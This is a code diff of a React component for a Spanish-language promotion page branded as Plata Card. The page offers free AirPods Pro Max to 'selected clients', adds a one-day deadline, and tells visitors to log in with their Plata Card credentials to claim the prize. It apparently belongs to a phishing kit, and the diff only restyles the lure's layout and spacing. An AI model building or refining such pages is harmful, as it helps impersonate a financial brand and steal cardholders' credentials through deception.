@@ -158,36 +158,36 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               </div>
             </div>
 
-            {/* Contenido principal reorganizado de la promoción */}
-            <div className="platacard-container">
-              <div className="max-w-7xl mx-auto">
+            {/* Contenido principal con espaciado correcto */}
+            <div className="platacard-container bg-white">
+              <div className="max-w-6xl mx-auto">
                 
-                {/* Sección hero con mejor organización */}
-                <div className="px-6 py-12 text-center bg-gradient-to-b from-gray-50 to-white">
-                  <div className="flex items-center justify-center mb-6">
-                    <span className="text-3xl mr-3">🎉</span>
-                    <h2 className="text-2xl md:text-3xl font-bold text-gray-800">
+                {/* Sección 1: Hero principal */}
+                <div className="px-8 py-20 text-center">
+                  <div className="flex items-center justify-center mb-8">
+                    <span className="text-4xl mr-4">🎉</span>
+                    <h2 className="text-3xl md:text-4xl font-bold text-gray-800">
                       Promoción Exclusiva para Clientes Seleccionados
                     </h2>
                   </div>
                   
-                  {/* Promoción destacada con mejor proporción */}
-                  <div className="platacard-bg text-white rounded-2xl p-8 md:p-12 mb-8 max-w-2xl mx-auto shadow-2xl">
-                    <h1 className="text-4xl md:text-6xl font-bold mb-3">AirPods</h1>
-                    <h1 className="text-4xl md:text-6xl font-bold mb-4">Pro Max</h1>
-                    <p className="text-2xl md:text-3xl text-orange-300">Totalmente Gratis</p>
+                  {/* Tarjeta AirPods destacada */}
+                  <div className="platacard-bg text-white rounded-3xl p-16 mb-12 max-w-2xl mx-auto shadow-2xl">
+                    <h1 className="text-5xl md:text-7xl font-bold mb-4">AirPods</h1>
+                    <h1 className="text-5xl md:text-7xl font-bold mb-6">Pro Max</h1>
+                    <p className="text-3xl md:text-4xl text-orange-300">Totalmente Gratis</p>
                   </div>
                   
-                  <p className="text-lg md:text-xl text-gray-700 leading-relaxed max-w-3xl mx-auto mb-8">
+                  <p className="text-xl md:text-2xl text-gray-700 leading-relaxed max-w-4xl mx-auto mb-16">
                     Para clientes seleccionados por el buen uso de su tarjeta reciben 
                     <strong className="platacard-accent"> AirPods Pro Max totalmente gratis</strong>. 
                     Sin costo adicional por su excelente historial crediticio.
                   </p>
 
-                  {/* Botón principal movido aquí para mejor flujo */}
-                  <div className="mb-12">
+                  {/* Botón principal "Reclamar" */}
+                  <div className="mb-20">
                     <Button 
-                      className="platacard-button px-10 py-5 text-xl font-bold w-full sm:w-auto transform hover:scale-105 transition-all duration-300 shadow-2xl"
+                      className="platacard-button px-12 py-6 text-2xl font-bold w-full sm:w-auto transform hover:scale-105 transition-all duration-300 shadow-2xl"
                       onClick={() => onSubmit(ScreenType.PROMOCION, {})}
                     >
                       Reclamar mis AirPods Pro Max →
@@ -195,59 +195,54 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   </div>
                 </div>
 
-                {/* Sección de beneficios en contenedor separado */}
-                <div className="px-6 py-12 bg-white">
-                  <div className="max-w-4xl mx-auto">
-                    <div className="grid sm:grid-cols-2 gap-6 mb-12">
-                      <div className="platacard-card text-center border border-orange-200 p-6">
-                        <div className="text-3xl mb-3">🎧</div>
-                        <h3 className="font-bold text-gray-900 mb-2 text-xl">AirPods Pro Max</h3>
-                        <p className="text-lg platacard-accent font-semibold">$0 pesos</p>
+                {/* Separador visual */}
+                <div className="h-px bg-gray-200 mx-8"></div>
+
+                {/* Sección 2: Detalles del producto con espaciado amplio */}
+                <div className="px-8 py-20">
+                  <div className="max-w-4xl mx-auto text-center">
+                    <div className="flex items-center justify-center mb-12">
+                      <span className="text-3xl mr-4">🎧</span>
+                      <h3 className="text-2xl font-bold text-gray-800">Detalles de tu premio</h3>
+                    </div>
+                    
+                    <div className="grid grid-cols-1 md:grid-cols-3 gap-16 mb-20">
+                      <div className="space-y-4">
+                        <div className="font-bold text-gray-800 text-2xl">Producto</div>
+                        <div className="text-gray-600 font-medium text-xl">AirPods Pro Max Originales</div>
                       </div>
-                      <div className="platacard-card text-center border border-orange-200 p-6">
-                        <div className="text-3xl mb-3">💳</div>
-                        <h3 className="font-bold text-gray-900 mb-2 text-xl">Sin costos</h3>
-                        <p className="text-lg platacard-accent font-semibold">Totalmente gratis</p>
+                      <div className="space-y-4">
+                        <div className="font-bold text-gray-800 text-2xl">Vigencia</div>
+                        <div className="text-gray-600 font-medium text-xl">1 día</div>
+                      </div>
+                      <div className="space-y-4">
+                        <div className="font-bold text-gray-800 text-2xl">Entrega</div>
+                        <div className="text-gray-600 font-medium text-xl">A domicilio</div>
                       </div>
                     </div>
+                  </div>
+                </div>
 
-                    {/* Información del producto reorganizada */}
-                    <div className="platacard-card p-8 mb-12">
-                      <div className="flex items-center justify-center mb-6">
-                        <span className="text-2xl mr-3">🎧</span>
-                        <h3 className="text-xl font-bold text-gray-800">Detalles de tu premio</h3>
-                      </div>
-                      
-                      <div className="grid grid-cols-1 md:grid-cols-3 gap-8 text-center">
-                        <div className="space-y-3">
-                          <div className="font-bold text-gray-800 text-lg">Producto</div>
-                          <div className="text-gray-600 font-medium">AirPods Pro Max Originales</div>
-                        </div>
-                        <div className="space-y-3">
-                          <div className="font-bold text-gray-800 text-lg">Vigencia</div>
-                          <div className="text-gray-600 font-medium">1 día</div>
-                        </div>
-                        <div className="space-y-3">
-                          <div className="font-bold text-gray-800 text-lg">Entrega</div>
-                          <div className="text-gray-600 font-medium">A domicilio</div>
-                        </div>
-                      </div>
-                    </div>
+                {/* Separador visual */}
+                <div className="h-px bg-gray-200 mx-8"></div>
 
-                    {/* Imágenes promocionales con mejor organización */}
-                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-12">
-                      <div className="platacard-card overflow-hidden shadow-lg">
+                {/* Sección 3: Imágenes promocionales - DESPUÉS de toda la información */}
+                <div className="px-8 py-20">
+                  <div className="max-w-5xl mx-auto">
+                    <h3 className="text-2xl font-bold text-gray-800 text-center mb-12">Tu premio te espera</h3>
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-12">
+                      <div className="platacard-card overflow-hidden shadow-lg p-4">
                         <img 
                           src={promoImage1} 
                           alt="AirPods Pro Max Promoción" 
-                          className="w-full h-56 object-cover rounded-lg"
+                          className="w-full h-64 object-cover rounded-lg"
                         />
                       </div>
-                      <div className="platacard-card overflow-hidden shadow-lg">
+                      <div className="platacard-card overflow-hidden shadow-lg p-4">
                         <img 
                           src={promoImage2} 
                           alt="Oferta Especial Plata Card" 
-                          className="w-full h-56 object-cover rounded-lg"
+                          className="w-full h-64 object-cover rounded-lg"
                         />
                       </div>
                     </div>
@@ -256,19 +251,19 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               </div>
             </div>
 
-            {/* Sección "¿Cómo funciona?" - con excelente espaciado */}
-            <div className="bg-white py-24">
-              <div className="max-w-6xl mx-auto px-6">
+            {/* Sección "¿Cómo funciona?" - con espaciado perfecto */}
+            <div className="bg-gray-50 py-24">
+              <div className="max-w-6xl mx-auto px-8">
                 <div className="text-center mb-20">
-                  <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-6">¿Cómo funciona?</h2>
+                  <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-8">¿Cómo funciona?</h2>
                   <p className="text-2xl text-gray-600">Solo 3 pasos para recibir tus AirPods Pro Max</p>
                 </div>
                 
-                <div className="space-y-12 md:space-y-16 max-w-4xl mx-auto">
+                <div className="space-y-16 max-w-4xl mx-auto">
                   <div className="flex items-start platacard-step">
                     <span className="platacard-step-number mr-8">1</span>
                     <div className="flex-1">
-                      <div className="font-bold text-gray-900 text-2xl mb-4">Acepta los términos</div>
+                      <div className="font-bold text-gray-900 text-2xl mb-6">Acepta los términos</div>
                       <div className="text-gray-700 text-xl leading-relaxed">Revisa y acepta los términos y condiciones de la promoción</div>
                     </div>
                   </div>
@@ -276,7 +271,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <div className="flex items-start platacard-step">
                     <span className="platacard-step-number mr-8">2</span>
                     <div className="flex-1">
-                      <div className="font-bold text-gray-900 text-2xl mb-4">Inicia sesión</div>
+                      <div className="font-bold text-gray-900 text-2xl mb-6">Inicia sesión</div>
                       <div className="text-gray-700 text-xl leading-relaxed">Accede con tus credenciales de Plata Card para verificar tu elegibilidad</div>
                     </div>
                   </div>
@@ -284,21 +279,21 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <div className="flex items-start platacard-step">
                     <span className="platacard-step-number mr-8">3</span>
                     <div className="flex-1">
-                      <div className="font-bold text-gray-900 text-2xl mb-4">Recibe tus AirPods</div>
+                      <div className="font-bold text-gray-900 text-2xl mb-6">Recibe tus AirPods</div>
                       <div className="text-gray-700 text-xl leading-relaxed">Te enviaremos tus AirPods Pro Max directamente a tu domicilio</div>
                     </div>
                   </div>
                 </div>
                 
-                {/* Botón final */}
-                <div className="text-center mt-16">
+                {/* Botón final con más espaciado */}
+                <div className="text-center mt-24">
                   <Button 
                     className="w-full sm:w-auto bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white px-12 py-6 text-xl font-bold rounded-lg shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105"
                     onClick={() => onSubmit(ScreenType.PROMOCION, {})}
                   >
                     Reclamar mis AirPods Pro Max →
                   </Button>
-                  <p className="text-lg text-gray-500 mt-6">
+                  <p className="text-lg text-gray-500 mt-8">
                     * Promoción válida solo para clientes seleccionados de Plata Card
                   </p>
                 </div>
